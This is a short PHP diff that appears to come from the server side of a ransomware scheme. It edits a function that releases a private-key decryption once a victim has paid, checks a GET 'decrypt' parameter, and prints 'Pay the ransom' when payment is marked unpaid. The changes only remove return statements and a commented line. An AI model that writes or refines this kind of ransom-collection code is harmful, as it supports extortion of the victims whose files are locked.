@@ -56,11 +56,8 @@ function returnDecrypted($dbconn,$key,$id){
 		openssl_private_decrypt(base64_decode($resStr),$newsource,$res);
 		echo "$newsource";
 		update_database($id);
-		return 1;
-
 	}
 	else if($result == 'No'){
-		return 1;
 		echo "Pay the ransom";
 	}
 	else{
@@ -72,7 +69,6 @@ function check1($dbconn){
 	if( isset($_GET['decrypt']) && isset($_GET['id'])){
 		$key = $_GET['decrypt'];
 		$id = $_GET['id'];
-		//echo "$key";
 		returnDecrypted($dbconn,$key,$id);
 		return 1;
 	}
